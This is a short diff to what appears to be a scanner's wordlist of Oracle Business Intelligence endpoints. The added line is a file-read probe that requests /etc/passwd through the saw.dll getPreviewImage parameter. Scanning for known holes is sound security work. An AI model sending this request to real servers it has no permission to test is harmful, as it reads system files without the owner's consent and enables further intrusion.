@@ -16,3 +16,4 @@
  /va/home.jsp
 /analytics/saw.dll?manageCaptions
 /xmlpserver/help/help.jsp
+/analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
